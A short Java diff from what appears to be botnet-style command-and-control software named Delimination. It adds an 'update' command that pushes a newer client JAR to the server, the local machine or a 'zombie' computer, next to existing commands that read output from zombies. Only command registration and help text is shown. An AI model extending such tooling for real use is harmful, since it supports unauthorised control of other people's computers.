@@ -57,6 +57,10 @@ public class ClientCommands {
 				new CommandData("rz <address>",
 						"Continuously reads the output from a zombie computer until the command is exited.", 1,
 						CommandActions.getReadFromZombieAction()));
+		commands.putCommand("update", new CommandData("update [server|this|zombie] {-i address}",
+				"Gets the newest version of the Delimination JAR for the specified target.", 1,
+				CommandActions.getUpdateAction(), new FlagData("-i",
+						"Sets the address of the computer whose client will be updated. Required if it is a zombie that is being updated.")));
 		commands.putCommand("rs",
 				new CommandData("rs", "Continuously reads the output from the server until the command is exited.", 0,
 						CommandActions.getReadFromServerAction()));
